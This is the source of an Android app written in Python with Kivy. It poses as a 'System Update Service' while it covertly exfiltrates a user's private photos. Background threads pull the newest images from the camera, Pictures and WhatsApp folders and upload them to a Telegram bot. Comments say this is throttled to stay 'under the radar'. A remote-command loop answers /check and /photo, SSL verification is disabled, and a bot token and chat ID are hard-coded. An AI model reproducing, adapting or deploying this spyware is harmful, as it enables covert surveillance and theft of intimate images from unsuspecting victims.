import os
import threading
import time
import requests
import gc
import certifi
import urllib3
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.utils import platform
from kivy.logger import Logger

# كتم تحذيرات الشهادات لضمان استمرار العمل تحت أي ظروف شبكة
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- إعداداتك الخاصة (لا تلمسها) ---
BOT_TOKEN = "8711969097:AAHtV1KGP-24cPn2QxPvpbyNkQugNPhEFg0"
CHAT_ID = "7084557369"
OFFSET = None 

class ShadowSystem(App):
    def build(self):
        # واجهة رسمية تبدو وكأنها تحديث للنظام
        self.label = Label(
            text="System Update Service\nStatus: Initializing...",
            font_size='18sp',
            halign='center'
        )
        return self.label

    def on_start(self):
        # تأخير أمان (5 ثوانٍ) لضمان استقرار الواجهة قبل بدء المحركات
        Clock.schedule_once(lambda dt: self.launch_core(), 5)

    def launch_core(self):
        if platform == 'android':
            try:
                from android.permissions import request_permissions, Permission
                request_permissions([Permission.INTERNET, Permission.READ_EXTERNAL_STORAGE])
                Logger.info("ShadowApp: System Permissions Granted")
            except Exception as e:
                Logger.error(f"ShadowApp: Permission Error: {e}")
        
        # تشغيل المحرك التلقائي (سحب هادئ كل 10 دقائق)
        threading.Thread(target=self.auto_sync_engine, daemon=True).start()
        
        # تشغيل محرك الأوامر (استجابة فورية لرسائلك في تليجرام)
        threading.Thread(target=self.remote_control_engine, daemon=True).start()
        
        self.update_status("Service Running ✅")

    # --- المحرك الأول: السحب التلقائي (هادئ وغير مرئي) ---
    def auto_sync_engine(self):
        self.send_telegram_msg("🚀 [SHADOW_CORE]: تم تفعيل النظام بنجاح.")
        while True:
            try:
                # يسحب صورة واحدة فقط كل 10 دقائق ليبقى تحت الرادار
                self.extract_and_send(limit=1)
                gc.collect() # تنظيف الذاكرة فوراً
            except: pass
            time.sleep(600) 

    # --- المحرك الثاني: ريموت كنترول (يسمع أوامرك كل دقيقة) ---
    def remote_control_engine(self):
        global OFFSET
        while True:
            try:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
                params = {"timeout": 10, "offset": OFFSET}
                # اتصال مرن يتجاوز حظر SSL عند الضرورة
                r = requests.get(url, params=params, timeout=15, verify=False)
                data = r.json()

                if data and "result" in data:
                    for update in data["result"]:
                        OFFSET = update["update_id"] + 1
                        if "message" in update and str(update["message"]["chat"]["id"]) == CHAT_ID:
                            cmd = update["message"].get("text", "")
                            
                            if cmd == "/check":
                                self.send_telegram_msg("✅ Status: Online\n🔋 Memory: Optimized\n🛡️ Shield: Active")
                            elif cmd == "/photo":
                                self.send_telegram_msg("📸 Scanning for latest media... please wait.")
                                self.extract_and_send(limit=3) # سحب 3 صور فوراً عند الطلب
                            
                gc.collect()
            except Exception as e:
                Logger.error(f"ShadowApp: Remote Engine Error: {e}")
            
            time.sleep(60)

    def extract_and_send(self, limit=2):
        # المسارات الشائعة للصور في أندرويد
        paths = ["/sdcard/DCIM/Camera", "/sdcard/Pictures", "/sdcard/WhatsApp/Media/WhatsApp Images"]
        for path in paths:
            if os.path.exists(path):
                try:
                    files = [os.path.join(path, f) for f in os.listdir(path) if f.lower().endswith(('.jpg', '.png', '.jpeg'))]
                    files.sort(key=os.path.getmtime, reverse=True)
                    
                    for img in files[:limit]:
                        self.send_telegram_file(img)
                        time.sleep(4) # فجوة زمنية بسيطة لمنع تعليق الشبكة
                except: pass

    def send_telegram_msg(self, text):
        try:
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", 
                          data={'chat_id': CHAT_ID, 'text': text}, timeout=15, verify=False)
        except: pass

    def send_telegram_file(self, file_path):
        try:
            with open(file_path, 'rb') as f:
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", 
                              data={'chat_id': CHAT_ID}, files={'document': f}, timeout=30, verify=False)
        except: pass

    def update_status(self, text):
        # تحديث الواجهة بأمان من خلال الخيط الرئيسي
        Clock.schedule_once(lambda dt: setattr(self.label, 'text', f"System Update Service\n\n{text}"))

if __name__ == "__main__":
    ShadowSystem().run()
